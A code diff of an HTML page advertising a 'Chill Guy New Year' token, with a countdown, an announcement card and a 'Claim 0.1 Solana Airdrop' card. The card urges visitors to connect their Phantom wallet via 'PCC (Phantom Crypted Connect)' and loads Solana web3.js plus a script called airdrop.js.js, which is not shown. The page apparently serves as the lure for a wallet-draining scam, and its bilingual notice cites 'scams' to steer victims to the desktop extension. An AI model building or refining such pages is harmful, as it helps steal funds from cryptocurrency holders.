@@ -8,22 +8,60 @@
     <link href="assets/css/base.css" rel="stylesheet" />
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.41.0/lib/index.iife.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Concert+One&family=Londrina+Solid:wght@100;300;400;900&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
 </head>
 <body>
-    <img class='logo' src='assets/css/logo2.png'></img>
-    <img class='mainAsset' src='assets/css/mainAsset.png'></img>
-    <div class="mainContent">
-    <p class="firstTitle">Connect your Phantom Wallet in one click !</p>
-    <h3>Use PCC (Phantom Crypted Connect) to connect your wallet :</h3>
-    <button class="connect-button" id="connect-wallet">Connect your Phantom Wallet with PCC</button>
-    <p>(Recommended)</p>
+    <img class="cgnylogo" src="assets/css/cgny.png">
+    <img class="cgny" src="assets/css/cgny.png">
+    <div class="navbar">
+        <ul class="menu">
+            <li class='home'><a href="#home">HOME</a></li>
+            <li><a href="#mainTitle">AIRDROP</a></li>
+            <li><a href="#roadmap">ROADMAP</a></li>
+            <li><a href="#tokenomics">TOKENOMICS</a></li>
+        </ul>
+    </div>
+
+    <div class="content"></div>
+    <div class="cardTime">
+        <div id="wrapper">
+            <div id="title">Chill Guy New Year <br><br> Contract Address :</div>
+            <div id="minuteur">
+                <div class="box">
+                    <div id="j"></div>
+                    <div class="unite">Jours</div>
+                </div>
+                <div class="box">
+                    <div id="h"></div>
+                    <div class="unite">Heures</div>
+                </div>
+                <div class="box">
+                    <div id="m"></div>
+                    <div class="unite">Minutes</div>
+                </div>
+                <div class="box">
+                    <div id="s"></div>
+                    <div class="unite">Secondes</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="advertCard">
+        <h1 class="announce">Announce</h1>
+    <p class="firstTitle2">🇫🇷 En raison des arnaques et des attaques ciblées sur les versions mobiles de Phantom, les airdrops seront exclusivement envoyés via l'extension Phantom sur ordinateur. <br> 🇺🇸 Due to scams and targeted attacks on the mobile versions of Phantom, airdrops will only be distributed via the Phantom browser extension on desktop.</p>
 </div>
-    <p id="wallet-info"></p>
+        <div class="airdropCard">
+            <img src="assets/css/phantom.png" width="60"></img>
+            <h1>Claim 0.1 Solana Airdrop</h1>
+        <p class="firstTitle">Connect your Phantom Wallet in one click !</p>
+        <h3>Use PCC (Phantom Crypted Connect) to connect your wallet :</h3>
+        <button class="connect-button" id="connect-wallet">Connect your Phantom Wallet with PCC</button>
+        <p style="font-size: 15px; color: #3C315B;">[Recommended]</p>
+    </div>
 
-    <!-- Optionally include some basic CSS for better layout -->
-    <style>
 
-    </style>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script defer src="assets/js/airdrop.js.js"></script>
 </body>
